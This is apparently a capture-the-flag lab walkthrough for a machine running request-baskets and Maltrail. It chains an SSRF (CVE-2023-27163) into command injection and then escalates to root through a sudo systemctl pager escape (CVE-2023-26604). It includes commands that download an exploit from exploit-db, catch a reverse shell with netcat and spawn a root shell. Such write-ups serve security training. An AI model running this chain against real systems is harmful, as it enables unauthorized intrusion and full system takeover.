Using nmap we use fast port search:

```
nmap -p- --min-rate=1000 -T4 {victim ip} 
```
We can take those ports and run them against a service search:

```
nmap -sC -sV {victim ip}
```

The webapp on the port 55555 has a request-baskets instance running. This is a web service that collects arbitrary HTTP requests and inspects them.

The version of requets-basket is 1.2.1, which has a Server-Side Request Forgery CVE-2023-27163

In the configurations on the web app add the forward url to `http://{local ip}`, then start a netcat listener on our local.

```
nc -lnvp 80
```

Send a `curl` to the web app

```
curl http://10.10.11.224:55555/2ck6d27
```
And we do get a GET request on the netcat listner.

We change the forwarding port in the configurations tab to localhost `127.0.0.1`, checking proxy response and expand forward path boxes.

If we look at the url and delete the `web` in `http://10.10.11.224:55555/web/<id>` we see that the web page is running Maltrail (v0.53) and is vulnerable to a unauthenticated OS Command Injection.

To get a foothold, we download the exploit:

```
curl -s https://www.exploit-db.com/download/51676 > exploit.py
```

And start a netcat listener:
```
nc -lnvp 4444
```

Now we run the exploit:

```
python3 exploit.py 10.10.14.6 4444 http://10.10.11.224:55555/2ck6d27
```
And we get a shell on the netcat listener

To get a better shell we run:

```
script /dev/null -c bash
```

The user on the system is puma, and we run `sudo -l` to see what software puma can run as super user.

```
NOPASSWD: /usr/bin/systemctl status trail.service
```

This is vulnerable to CVE-2023-26604

We run 

```
sudo /usr/bin/systemctl status trail.service
```

Press return once, then run `!/bin/bash` and we get root access.

We can find the root flag in the file `/root/root.txt`
